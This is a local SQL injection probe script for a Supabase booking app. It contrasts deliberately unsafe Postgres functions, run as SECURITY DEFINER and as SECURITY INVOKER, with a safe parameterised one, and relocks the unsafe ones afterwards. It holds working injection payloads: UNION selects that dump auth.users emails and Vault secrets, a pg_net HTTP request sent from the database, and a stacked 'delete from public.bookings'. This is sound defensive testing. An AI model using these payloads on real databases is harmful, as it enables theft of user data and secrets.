// SQL injection proof. Local only. Run: npm run probe:security:sqli
//
// 1. supabase-js filters are parameterised: SQL in a filter value is just text.
//    (Filter STRINGS built from user input, like .or(`…${input}`), can still be bent, but only
//    within what RLS already lets that user see.)
// 2. An unsafe Postgres function (string concatenation + EXECUTE), SECURITY DEFINER (runs as its
//    owner, postgres: RLS off), exploited through rpc(): other hosts' guests, every account's
//    email address and the Vault secrets leak.
// 3. The SAME unsafe function as SECURITY INVOKER (runs as the caller): the injection still works,
//    but only within the caller's rights: RLS keeps it to their own bookings, auth.users and
//    Vault are refused. Those rights still include pg_net (the database sends an HTTP request).
// 4. The safe version (parameters + format %I) stops the same attacks.
// 5. Both unsafe functions are locked again afterwards (no grant, switch off), also after a crash.
import { createClient } from '@supabase/supabase-js'
import { execSync } from 'node:child_process'

const DB = 'postgresql://postgres:postgres@127.0.0.1:54322/postgres'
const URL = process.env.VITE_SUPABASE_URL
const KEY = process.env.VITE_SUPABASE_ANON_KEY
const psql = (q) => execSync(`psql ${DB} -At -F'|' -c "${q.replace(/"/g, '\\"')}"`).toString().trim()
const client = () => createClient(URL, KEY, { auth: { persistSession: false } })
const at = (h) => new Date(Date.now() + h * 3600_000).toISOString()
const run = Date.now()

let failures = 0
function check(name, ok, detail) {
  if (!ok) failures++
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail && !ok ? `\n      → ${detail}` : ''}`)
}

// Locks for the two unsafe functions. lock() runs on every exit, including a crash or Ctrl+C.
const UNSAFE = ['sqli_search_bookings_unsafe', 'sqli_search_bookings_unsafe_invoker']
const unlock = () => {
  for (const f of UNSAFE) psql(`grant execute on function public.${f}(text) to authenticated`)
  psql(`update sqli_probe_switch set unsafe_enabled_until = now() + interval '2 minutes' where id = 1`)
}
const lock = () => {
  for (const f of UNSAFE) psql(`revoke execute on function public.${f}(text) from authenticated`)
  psql(`update sqli_probe_switch set unsafe_enabled_until = null where id = 1`)
}
const users = []
process.on('exit', () => {
  lock()
  if (users.length) psql(`delete from auth.users where id in (${users.map((u) => `'${u}'`).join(',')})`)
})
process.on('SIGINT', () => process.exit(130))

async function host(name) {
  const c = client()
  const { data, error } = await c.auth.signUp({ email: `${name}-${run}@test.dev`, password: 'secret123', options: { data: { display_name: name } } })
  if (error) throw error
  users.push(data.user.id)
  return { c, id: data.user.id }
}
const anon = client()
const A = await host('sqli-attacker')  // a normal host account: the attacker
const B = await host('sqli-victim')    // another host with real guests

// Each host gets two booked slots.
const evil = `' or '1'='1`
for (const [h, guests] of [[A, ['alice@example.com', 'carol@example.com']], [B, ['victim-guest@example.com', 'secret-client@example.com']]]) {
  for (const [n, email] of guests.entries()) {
    const slot = (await h.c.from('slots').insert({ host_id: h.id, starts_at: at(300 + n + (h === B ? 10 : 0)), ends_at: at(301 + n + (h === B ? 10 : 0)) }).select().single()).data.id
    await anon.from('bookings').insert({ slot_id: slot, guest_name: n === 0 && h === A ? evil : `Guest ${n}`, guest_email: email, cancel_token: crypto.randomUUID() })
  }
}

// ===========================================================================
console.log('\n# 1. supabase-js filters are parameterised')
let r = await A.c.from('bookings').select('guest_email').eq('guest_email', `x' or '1'='1`)
check(`.eq('guest_email', "x' or '1'='1") → ${r.data?.length} rows (the quote is just a character)`, !r.error && r.data.length === 0, JSON.stringify(r))
r = await A.c.from('bookings').select('guest_email').ilike('guest_email', `%' or true --%`)
check(`.ilike('guest_email', "%' or true --%") → ${r.data?.length} rows`, !r.error && r.data.length === 0, JSON.stringify(r))
r = await A.c.from('bookings').select('guest_name').eq('guest_name', evil)
check(`a guest literally named "${evil}" is found by .eq() exactly once (stored and matched as text)`, r.data?.length === 1, JSON.stringify(r))
// Not SQL injection, but the same mistake one level up: gluing input into a PostgREST filter string.
const input = 'nobody@example.com,guest_email.neq.x'
r = await A.c.from('bookings').select('guest_email').or(`guest_email.eq.${input}`)
check(`.or(\`guest_email.eq.\${input}\`) with input "${input}" → ${r.data?.length} rows: the input added its own condition (filter injection)…`, r.data?.length === 2, JSON.stringify(r.data))
check('…but RLS still kept it to the attacker\'s own bookings (none of host B\'s guests)', !r.data?.some((x) => x.guest_email.includes('victim') || x.guest_email.includes('secret')))

// ===========================================================================
console.log('\n# 2. The unsafe function as SECURITY DEFINER (runs as postgres, RLS off), exploited through rpc()')
r = await A.c.rpc('sqli_search_bookings_unsafe', { p_search: 'example' })
check(`before the probe enables it: blocked (${r.error?.code} ${r.error?.message})`, r.error?.code === '42501')
unlock()
r = await A.c.rpc('sqli_search_bookings_unsafe', { p_search: 'alice' })
check(`normal use: host A searches "alice" → ${r.data?.length} row (their own guest)`, r.data?.length === 1, JSON.stringify(r))
r = await A.c.rpc('sqli_search_bookings_unsafe', { p_search: `zzz%' or true --` })
const leakedGuests = r.data?.filter((x) => x.host_id !== A.id) ?? []
check(`input "zzz%' or true --" → ${r.data?.length} rows, ${leakedGuests.length} of them OTHER hosts' bookings (e.g. ${leakedGuests.find((x) => x.host_id === B.id)?.guest_email})`,
  leakedGuests.some((x) => x.host_id === B.id), JSON.stringify(r))
r = await A.c.rpc('sqli_search_bookings_unsafe', { p_search: `zzz%' union all select 'account', email::text, created_at, id from auth.users --` })
const total = Number(psql(`select count(*) from auth.users`))
check(`input "…union all select … from auth.users --" → ${r.data?.length} rows: every user account's email address (${total} accounts)`,
  r.data?.length === total && r.data.some((x) => x.guest_email === `sqli-victim-${run}@test.dev`), JSON.stringify(r).slice(0, 300))
r = await A.c.rpc('sqli_search_bookings_unsafe', { p_search: `zzz%' union all select decrypted_secret, name, now(), null from vault.decrypted_secrets --` })
check(`input "…union all select … from vault.decrypted_secrets --" → ${r.data?.length ?? 0} rows: the project's Vault secrets (values not printed)`,
  (r.data?.length ?? 0) > 0, JSON.stringify(r.error))

// ===========================================================================
console.log('\n# 3. The same unsafe function as SECURITY INVOKER (runs as the caller, RLS on)')
r = await A.c.rpc('sqli_search_bookings_unsafe_invoker', { p_search: `zzz%' or true --` })
check(`input "zzz%' or true --" → ${r.data?.length} rows: the injection works, but RLS keeps it to the attacker's own bookings (0 of host B's)`,
  r.data?.length === 2 && r.data.every((x) => x.host_id === A.id), JSON.stringify(r))
r = await A.c.rpc('sqli_search_bookings_unsafe_invoker', { p_search: `zzz%' union all select 'account', email::text, created_at, id from auth.users --` })
check(`"…from auth.users --" → refused (${r.error?.code} ${r.error?.message})`, r.error?.code === '42501' && !r.data)
r = await A.c.rpc('sqli_search_bookings_unsafe_invoker', { p_search: `zzz%' union all select decrypted_secret, name, now(), null from vault.decrypted_secrets --` })
check(`"…from vault.decrypted_secrets --" → refused (${r.error?.code} ${r.error?.message})`, r.error?.code === '42501' && !r.data)
// What the caller's role may do still includes Supabase's default grants outside the API schemas:
// pg_net's HTTP functions. The injected SQL makes the database server send a request (a harmless
// local one, to Mailpit's info endpoint).
r = await A.c.rpc('sqli_search_bookings_unsafe_invoker', {
  p_search: `zzz%' union all select 'request', net.http_get('http://host.docker.internal:54324/api/v1/info')::text, now(), null --`,
})
const requestId = r.data?.find((x) => x.guest_name === 'request')?.guest_email
await new Promise((ok) => setTimeout(ok, 2500))
const sent = requestId ? psql(`select coalesce(max(status_code)::text, 'no response') from net._http_response where id = ${Number(requestId)}`) : 'not queued'
check(`"…net.http_get('http://…')" → the database sent an HTTP request for the attacker (request ${requestId}, response ${sent})`, sent === '200', JSON.stringify(r))

// ===========================================================================
console.log('\n# 4. The safe version, same attacks')
r = await A.c.rpc('sqli_search_bookings_safe', { p_search: 'alice' })
check(`normal use: "alice" → ${r.data?.length} row`, r.data?.length === 1, JSON.stringify(r))
for (const attack of [`zzz%' or true --`, `zzz%' union all select 'account', email::text, created_at, id from auth.users --`]) {
  r = await A.c.rpc('sqli_search_bookings_safe', { p_search: attack })
  check(`"${attack.slice(0, 45)}…" → ${r.data?.length} rows (searched for literally)`, !r.error && r.data.length === 0, JSON.stringify(r))
}
r = await A.c.rpc('sqli_search_bookings_safe', { p_search: '', p_sort: 'starts_at; delete from public.bookings --' })
check(`sort column "starts_at; delete from public.bookings --" → error, nothing run (${r.error?.message})`, r.error?.code === '42703')
check('…and every booking is still there', psql(`select count(*) from bookings b join slots s on s.id = b.slot_id where s.host_id in ('${A.id}', '${B.id}')`) === '4')
r = await anon.rpc('sqli_search_bookings_safe', { p_search: 'example' })
check(`anon (public key only) can't call even the safe one (${r.error?.code})`, !!r.error)

// ===========================================================================
console.log('\n# 5. Locks')
psql(`update sqli_probe_switch set unsafe_enabled_until = now() - interval '1 second' where id = 1`)
r = await A.c.rpc('sqli_search_bookings_unsafe', { p_search: `zzz%' or true --` })
check(`still granted, but the 2-minute switch ran out → refused (${r.error?.message})`, r.error?.code === '42501' && !r.data)
lock()
r = await A.c.rpc('sqli_search_bookings_unsafe', { p_search: `zzz%' or true --` })
check(`after the run: no permission (${r.error?.code})`, r.error?.code === '42501')
r = await A.c.rpc('sqli_search_bookings_unsafe_invoker', { p_search: `zzz%' or true --` })
check(`…same for the INVOKER version (${r.error?.code})`, r.error?.code === '42501')
const granted = UNSAFE.map((f) => psql(`select has_function_privilege('authenticated', 'public.${f}(text)', 'execute') or has_function_privilege('anon', 'public.${f}(text)', 'execute')`))
check('no API role may execute either unsafe function, and the switch is off', granted.every((g) => g === 'f') && psql(`select unsafe_enabled_until is null from sqli_probe_switch`) === 't')

console.log(`\n${failures === 0 ? 'All checks passed' : `${failures} check(s) failed`} (test hosts deleted, unsafe functions locked)`)
process.exit(failures === 0 ? 0 : 1)
